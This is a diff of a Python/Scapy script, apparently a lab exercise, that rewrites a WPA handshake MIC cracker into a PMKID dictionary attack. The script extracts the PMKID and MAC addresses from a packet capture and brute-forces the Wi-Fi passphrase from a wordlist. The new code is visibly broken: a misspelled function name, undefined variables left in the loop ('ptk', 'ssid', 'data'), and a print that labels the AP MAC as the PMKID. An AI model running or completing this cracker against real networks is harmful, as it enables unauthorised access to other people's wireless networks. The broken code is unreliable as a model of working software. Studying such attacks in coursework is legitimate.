@@ -44,36 +44,28 @@ def get_association_info(packets):
     for p in packets:
         if p.haslayer("Dot11AssoReq"):
             ssid = p.info
+            print(ssid)
             ap_mac = a2b_hex(p.addr1.replace(':', ''))
             client_mac = a2b_hex(p.addr2.replace(':', ''))
             return ssid, ap_mac, client_mac
-
     raise Exception("Couldn't find WPA association")
 
 
-def get_hand_shake(packets):
+def get_pmkid_packet(packets):
     """
-    returns an array containing the 4-way handshake WPA_key layers
+    returns the first packet containing a PMKID value. It is always the first message of a 4-way handshake
     """
-    handshake = []
     for p in packets:
-        if p.haslayer(WPA_key):
-            handshake.append(p[WPA_key])
+        # Find the first message of a handshake. It is caracterized by having wpa_key_mic at 0
+        if p.haslayer(WPA_key) and not int.from_bytes(p.wpa_key_mic, "big"): # big or little endian is not important
+            return p
 
-    if len(handshake) != 4:
-        raise Exception("Couldn't find all 4 packets of the handshake")
+    raise Exception("Couldn't find PMKID")
 
-    return handshake
-
-
-def mic_bruteforce(A, B, ssid, data, mic_expected, wordlist):
-    """
-    Try to find a collision with the expected mic, using the wordlist.
-    """
+def pmkid_brutefore(pmkid, mac_ap, mac_sta, const, wordlist):
 
     with open(wordlist) as file1:
-
-        mic_expected = b2a_hex(mic_expected)
+        pmkid_expected = b2a_hex(pmkid)
 
         for passphrase in file1:
 
@@ -83,8 +75,6 @@ def mic_bruteforce(A, B, ssid, data, mic_expected, wordlist):
             # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
             pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
 
-            # expand pmk to obtain PTK
-            ptk = customPRF512(pmk, str.encode(A), B)
 
             # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
             mic = hmac.new(ptk[0:16], data, hashlib.sha1)
@@ -95,6 +85,7 @@ def mic_bruteforce(A, B, ssid, data, mic_expected, wordlist):
             if mic_guess == mic_expected:
                 print("")
                 return passphrase.decode()
+
     print("")
     return None
 
@@ -103,53 +94,28 @@ def main(pcap_file, dictionary):
     # Read capture file -- it contains beacon, authentication, association, handshake and data
     wpa = rdpcap(pcap_file)
 
-    # Important parameters for key derivation - most of them can be obtained from the pcap file
-    ssid, ap_mac, client_mac = get_association_info(wpa)
-    A = "Pairwise key expansion"  # this string is used in the pseudo-random function
+    p = get_pmkid_packet(wpa)
 
-    handshake = get_hand_shake(wpa)
-    hs1 = handshake[0]
-    hs2 = handshake[1]
-    hs3 = handshake[2]
-    hs4 = handshake[3]
-    print(ssid)
-    hs1.show2()
-    # Authenticator and Supplicant Nonces
-    a_nonce = hs1.nonce
-    s_nonce = hs2.nonce
+    pmkid = p.wpa_key[-16:]
+    
+    ap_mac = p.addr1
+    sta_mac = p.addr2
+    const = "PMK Name"
 
-    # This is the MIC contained in the 4th frame of the 4-way handshake
-    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-    '''
-    mic_to_test = hs4.wpa_key_mic
-
-    B = min(ap_mac, client_mac) \
-        + max(ap_mac, client_mac) \
-        + min(a_nonce, s_nonce) \
-        + max(a_nonce, s_nonce)  # used in pseudo-random function
-
-    hs4.wpa_key_mic = ""  # set MIC bytes to 0
-    data = bytes(hs4.underlayer)
-
-    print("Values used to derivate keys:")
-    print("SSID:        ", ssid)
+    print("Values used to calculate PMKID:")
+    print("PMKID:       ", b2a_hex(ap_mac))
     print("AP Mac:      ", b2a_hex(ap_mac))
-    print("CLient Mac:  ", b2a_hex(client_mac))
-    print("AP Nonce:    ", b2a_hex(a_nonce))
-    print("Client Nonce:", b2a_hex(s_nonce))
-    print("Data:        ", b2a_hex(data))
+    print("CLient Mac:  ", b2a_hex(sta_mac))
+    print("Constant:    ", const)
 
-    # Bruteforce
-    print("\nBruteforcing MIC")
-    print("============================")
-    print("Expected MIC:         ", b2a_hex(mic_to_test))
-    passphrase = mic_bruteforce(A, B, ssid, data, mic_to_test, dictionary)
+    passphrase = pmkid_bruteforce(pmkid, ap_mac, sta_mac, const, dictionary)
 
     if passphrase:
         print("Found passphrase:", passphrase)
     else:
         print("Couldn't find the passphrase with this word list.")
-    '''
+
+
 
 if __name__ == "__main__":
 
